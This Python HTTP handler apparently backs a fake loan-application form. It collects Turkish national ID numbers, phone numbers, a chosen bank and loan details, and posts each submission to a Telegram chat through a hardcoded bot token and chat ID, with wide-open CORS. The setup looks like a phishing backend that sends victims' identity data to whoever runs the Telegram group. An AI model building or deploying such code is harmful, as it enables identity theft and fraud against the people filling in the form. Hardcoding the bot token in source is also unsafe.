from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse
import os
from datetime import datetime

applications_storage = []

def load_applications():
    global applications_storage
    return applications_storage

def save_applications(applications):
    global applications_storage
    applications_storage = applications

def get_telegram_settings():
    try:
        bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA')
        chat_id = os.environ.get('TELEGRAM_CHAT_ID', '-4915858013')
        return {"bot_token": bot_token, "chat_id": chat_id}
    except:
        return {
            "bot_token": "6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA",
            "chat_id": "-4915858013"
        }

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            applications = load_applications()
            application = {
                "id": len(applications) + 1,
                "tc_kimlik": data["tc_kimlik"],
                "telefon": data["telefon"],
                "bank_name": data["bank_name"],
                "amount": data["amount"],
                "months": data["months"],
                "status": "pending",
                "created_at": datetime.now().isoformat()
            }
            
            applications.append(application)
            save_applications(applications)
            
            import sys
            import importlib
            if 'applications' in sys.modules:
                apps_module = sys.modules['applications']
                if hasattr(apps_module, 'applications_storage'):
                    apps_module.applications_storage = applications
            
            telegram_settings = get_telegram_settings()
            bot_token = telegram_settings.get("bot_token")
            chat_id = telegram_settings.get("chat_id")
            
            message = f"""🏦 Yeni Kredi Başvurusu

👤 T.C. Kimlik: {data['tc_kimlik']}
📞 Telefon: {data['telefon']}
🏛️ Banka: {data['bank_name']}
💰 Tutar: {data['amount']:,} TL
📅 Vade: {data['months']} ay
⏰ Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}"""

            telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            telegram_data = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            try:
                req = urllib.request.Request(
                    telegram_url,
                    data=urllib.parse.urlencode(telegram_data).encode(),
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                urllib.request.urlopen(req)
            except Exception as e:
                print(f"Telegram error: {e}")
            
            response = {"success": True, "message": "Başvuru başarıyla gönderildi"}
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            response = {"success": False, "message": str(e)}
            self.wfile.write(json.dumps(response).encode())
